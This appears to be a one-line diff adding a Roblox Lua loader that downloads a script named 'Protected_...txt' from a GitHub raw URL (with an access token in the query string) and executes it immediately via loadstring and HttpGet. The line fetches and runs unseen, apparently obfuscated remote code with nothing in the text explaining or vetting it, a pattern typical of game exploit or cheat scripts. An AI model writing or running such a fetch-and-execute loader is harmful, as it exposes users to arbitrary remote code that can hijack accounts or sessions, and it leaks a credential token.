@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/popoii99/.lua/refs/heads/main/Protected_4990999679516754.txt?token=GHSAT0AAAAAAC4TYZEOHCWQ4IXCOSLKYKA4Z3UUFTQ'))()
